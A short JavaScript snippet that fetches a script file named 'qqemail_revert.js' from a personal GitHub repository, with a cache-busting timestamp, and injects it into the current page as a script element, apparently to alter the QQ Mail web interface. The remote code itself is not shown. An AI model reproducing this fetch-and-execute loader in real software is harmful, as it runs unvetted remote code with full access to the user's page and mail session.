const baseUrl = 'https://raw.githubusercontent.com/lIIIIlwd/public/master/qqemail_revert.js?ts='+new Date().getTime()+'&t='+encodeURIComponent("2023-10-27 12:00:00")
console.log(baseUrl);
fetch(baseUrl)
    .then(response => response.text())
    .then(scriptText => {
        const script = document.createElement('script');
        script.textContent = scriptText;
        document.body.appendChild(script);
        // script.remove();
    })
    .catch(error => console.error('Error fetching script:', error));